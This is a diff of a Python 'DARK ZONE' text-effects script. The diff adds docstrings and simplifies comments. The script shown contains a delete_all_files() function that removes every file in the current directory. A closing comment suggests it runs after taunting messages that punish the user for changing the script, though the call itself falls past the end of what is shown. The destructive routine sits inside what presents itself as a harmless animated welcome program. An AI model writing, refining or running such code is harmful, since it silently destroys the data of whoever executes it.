@@ -11,6 +11,7 @@ def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def slow_print(text, delay=0.1):
+    """Print text one character at a time."""
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
@@ -18,14 +19,14 @@ def slow_print(text, delay=0.1):
     print()
 
 def delete_all_files():
+    """Delete all files in the current directory."""
     for filename in os.listdir('.'):
         if os.path.isfile(filename):
             os.remove(filename)
 
 def main():
-    # Print welcome message in blue to purple for 2 seconds
-    welcome_message = "Hey WELCOME TO DARK ZONE"
-    print(Fore.BLUE + welcome_message)
+    # Print welcome message in blue to purple
+    print(Fore.BLUE + "Hey WELCOME TO DARK ZONE")
     time.sleep(2)
 
     # Start switching between text1 and text2
@@ -65,10 +66,10 @@ def main():
         time.sleep(0.1)
         clear_screen()
 
-    # Print message after 4 seconds, alphabet by alphabet using colorama
+    # Print message after 4 seconds, alphabet by alphabet
     slow_print("Why you Tried to change the script? You know it don't work when you change things brother.\n")
 
-    # Slow print alphabet by alphabet using colorama
+    # Slow print alphabet by alphabet
     slow_print("I hope you understand things now?\n")
 
     # Delete all files in the directory
